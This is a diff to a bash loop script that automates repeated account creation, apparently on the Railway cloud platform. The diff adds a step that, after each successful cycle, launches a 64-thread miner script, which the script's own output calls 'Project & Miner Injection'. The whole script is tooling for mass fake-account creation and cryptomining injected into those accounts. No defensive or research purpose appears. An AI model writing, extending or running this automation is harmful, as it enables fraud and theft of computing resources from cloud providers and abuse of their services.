@@ -50,13 +50,17 @@ while true; do
         break
     fi
 
-    echo "🔄 Starting account creation cycle..."
+    echo "🔄 Starting account creation & mining cycle..."
     cd /root/automation-toolkit/railway-docker
 
     BRD_WSS="$BD_WSS" python3 -u railway-HOLY-cloud.py --cloud-no-c 2>&1 | tee -a "/tmp/sandbox_${SANDBOX_NUM}.log" | tail -20
 
     EXIT_CODE=$?
-    if [ $EXIT_CODE -ne 0 ]; then
+    if [ $EXIT_CODE -eq 0 ]; then
+        echo "⚡ Real-Time Pipeline: Launching Project & Miner Injection..."
+        cd /root/automation-toolkit
+        xvfb-run -a --server-args="-screen 0 1280x720x24" python3 -u chimera-miner/script3_launch_miner.py --session "${SANDBOX_NUM}" --mode gh --threads 64 2>&1 | tee -a "/tmp/sandbox_${SANDBOX_NUM}_miner.log" || true
+    else
         echo "⚠️  Cycle exited with code $EXIT_CODE, retrying in 5s..."
         sleep 5
     fi
